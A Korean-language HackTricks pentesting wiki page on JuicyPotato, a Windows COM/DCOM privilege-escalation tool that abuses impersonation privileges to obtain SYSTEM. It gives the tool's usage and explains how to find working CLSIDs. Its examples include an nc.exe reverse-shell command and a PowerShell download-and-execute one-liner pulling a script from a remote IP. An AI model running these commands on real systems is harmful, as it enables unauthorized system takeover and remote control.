# JuicyPotato

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 제로부터 전문가까지 배우세요</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **HackTricks에 귀사를 광고하고 싶으신가요**? 혹은 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* [**공식 PEASS & HackTricks 스왹**](https://peass.creator-spring.com)을 받으세요
* **💬** [**Discord 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 참여하시거나 **트위터**에서 저를 팔로우하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **해킹 요령을 공유하세요.** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **로 PR을 제출하세요.**

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)은 **다크 웹**을 통해 **무료** 기능을 제공하는 검색 엔진으로, 회사나 그 고객이 **스틸러 악성 소프트웨어**에 의해 **침해**되었는지 확인할 수 있습니다.

WhiteIntel의 주요 목표는 정보 도난 악성 소프트웨어로 인한 계정 탈취 및 랜섬웨어 공격을 막는 것입니다.

그들의 웹사이트를 확인하고 **무료**로 엔진을 시험해 볼 수 있습니다:

{% embed url="https://whiteintel.io" %}

***

{% hint style="warning" %}
**JuicyPotato는** Windows Server 2019 및 Windows 10 빌드 1809 이후에서 작동하지 않습니다. 그러나 [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)를 사용하여 **동일한 권한을 활용하고 `NT AUTHORITY\SYSTEM` 수준의 액세스를 얻을 수 있습니다. _**확인:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (황금 권한 남용) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_RottenPotatoNG_의 달콤한 버전으로, **Windows 서비스 계정에서 NT AUTHORITY\SYSTEM으로의 로컬 권한 상승 도구**입니다.

#### [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)에서 juicypotato를 다운로드할 수 있습니다.

### 요약 <a href="#summary" id="summary"></a>

[**juicy-potato Readme에서**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) 및 그 [변형](https://github.com/decoder-it/lonelypotato)은 [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [서비스](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126)를 기반으로 한 권한 상승 체인을 활용하며, `127.0.0.1:6666`에서 MiTM 리스너를 가지고 있고 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한이 있는 경우입니다. Windows 빌드 검토 중에 `BITS`가 의도적으로 비활성화되었고 포트 `6666`이 사용 중인 것을 발견했습니다.

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)을 무장화하기로 결정했습니다: **Juicy Potato를 만나보세요**.

> 이론을 보려면 [Rotten Potato - 서비스 계정에서 SYSTEM으로의 권한 상승](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)을 참조하고 링크 및 참조 사슬을 따르세요.

`BITS` 이외에도 현재 사용자(일반적으로 임펄슨 권한을 가진 "서비스 사용자")에 의해 인스턴스화될 수 있는 여러 COM 서버를 남용할 수 있다는 것을 발견했습니다. 그들은 단지:

1. 현재 사용자(일반적으로 임펄슨 권한을 가진 "서비스 사용자")에 의해 인스턴스화될 수 있어야 합니다.
2. `IMarshal` 인터페이스를 구현해야 합니다.
3. 슈퍼 유저(SYSTEM, 관리자, ...)로 실행되어야 합니다.

일부 테스트를 거친 후, 여러 Windows 버전에서 [흥미로운 CLSID 목록](http://ohpe.it/juicy-potato/CLSID/)을 획득하고 테스트했습니다.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato를 사용하면 다음을 수행할 수 있습니다:

* **대상 CLSID** _원하는 CLSID를 선택하세요._ [_여기_](http://ohpe.it/juicy-potato/CLSID/) _에서 OS별로 정리된 목록을 찾을 수 있습니다._
* **COM Listening port** _하드코딩된 6666 대신 선호하는 COM Listening 포트를 정의하세요_
* **COM Listening IP address** _서버를 원하는 IP에 바인딩하세요_
* **프로세스 생성 모드** _임펄슨된 사용자의 권한에 따라 다음 중 선택할 수 있습니다:_
* `CreateProcessWithToken` (`SeImpersonate` 필요)
* `CreateProcessAsUser` (`SeAssignPrimaryToken` 필요)
* `both`
* **시작할 프로세스** _악용이 성공하면 실행할 실행 파일 또는 스크립트_
* **프로세스 인수** _시작된 프로세스 인수를 사용자 정의하세요_
* **RPC 서버 주소** _외부 RPC 서버에 인증할 수 있는 은밀한 방법_
* **RPC 서버 포트** _외부 서버에 인증하려는 경우 유용하며 방화벽이 포트 `135`를 차단하는 경우..._
* **TEST 모드** _주로 테스트 목적으로, 즉 CLSID를 테스트합니다. DCOM을 생성하고 토큰의 사용자를 출력합니다. 테스트를 위해_ [_여기를 참조하세요_](http://ohpe.it/juicy-potato/Test/)
### 사용법 <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 최종 결론 <a href="#final-thoughts" id="final-thoughts"></a>

[**주이시 포테이토 Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

만약 사용자가 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한을 가지고 있다면 당신은 **SYSTEM** 입니다.

모든 이러한 COM 서버의 남용을 방지하는 것은 거의 불가능합니다. `DCOMCNFG`를 통해 이러한 객체의 권한을 수정할 수 있지만, 행운을 빕니다. 이것은 도전적일 것입니다.

실제 해결책은 `* SERVICE` 계정 아래에서 실행되는 민감한 계정 및 응용 프로그램을 보호하는 것입니다. `DCOM`을 중지하면 이 취약점을 억제할 수 있지만, 기본 OS에 심각한 영향을 줄 수 있습니다.

출처: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## 예시

참고: CLSID 목록을 시도하려면 [이 페이지](https://ohpe.it/juicy-potato/CLSID/)를 방문하십시오.

### nc.exe 역쉘 얻기
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### 파워셸 역전
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 새 CMD 창 열기 (RDP 액세스가 있는 경우)

![](<../../.gitbook/assets/image (300).png>)

## CLSID 문제

대부분 JuicyPotato가 사용하는 기본 CLSID는 **작동하지 않을 수 있으며** exploit이 실패할 수 있습니다. 일반적으로 **작동하는 CLSID**를 찾기 위해 여러 번 시도해야 합니다. 특정 운영 체제에 대해 시도할 CLSID 목록을 얻으려면 다음 페이지를 방문해야 합니다:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **CLSIDs 확인**

먼저, juicypotato.exe 이외의 몇 가지 실행 파일이 필요합니다.

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)를 다운로드하여 PS 세션에 로드하고 [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)를 다운로드하고 실행하세요. 해당 스크립트는 테스트할 가능한 CLSID 목록을 생성합니다.

그런 다음 [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(CLSID 목록 및 juicypotato 실행 파일 경로를 변경)을 다운로드하고 실행하세요. 모든 CLSID를 시도하기 시작하고, **포트 번호가 변경되면 CLSID가 작동한 것**을 의미합니다.

**-c** 매개변수를 사용하여 **작동하는 CLSID를 확인**하세요.

## 참고 자료

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)은 **다크 웹**을 기반으로 하는 검색 엔진으로, 회사나 그 고객이 **스틸러 악성 코드**에 의해 **침해**를 당했는지 무료로 확인할 수 있는 기능을 제공합니다.

WhiteIntel의 주요 목표는 정보 탈취 악성 코드로 인한 계정 탈취 및 랜섬웨어 공격을 막는 것입니다.

그들의 웹사이트를 방문하여 **무료로** 엔진을 시도해 볼 수 있습니다:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)로부터 AWS 해킹을 제로부터 전문가까지 배우세요</strong></summary>

* **사이버 보안 회사에서 일하시나요? 귀하의 회사가 HackTricks에서 광고되길 원하시나요? 또는 최신 PEASS 버전에 액세스하거나 HackTricks를 PDF로 다운로드하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 얻으세요
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요**.
* **해킹 트릭을 공유하려면 PR을** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 제출하세요**.

</details>
